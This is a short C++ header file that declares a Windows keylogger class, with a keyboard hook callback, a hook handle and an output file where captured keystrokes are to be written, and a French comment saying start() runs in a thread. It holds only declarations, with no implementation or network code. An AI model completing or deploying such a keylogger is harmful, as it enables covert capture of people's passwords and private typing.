#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <windows.h>
#include <fstream>
#include <string>

class KeyLogger {
public:
    KeyLogger(const std::string& filename);
    void start();  // non bloquant, à appeler dans un thread

private:
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static std::ofstream outFile;
    static HHOOK hook;
    static std::string filePath;
};

#endif // KEYLOGGER_HPP
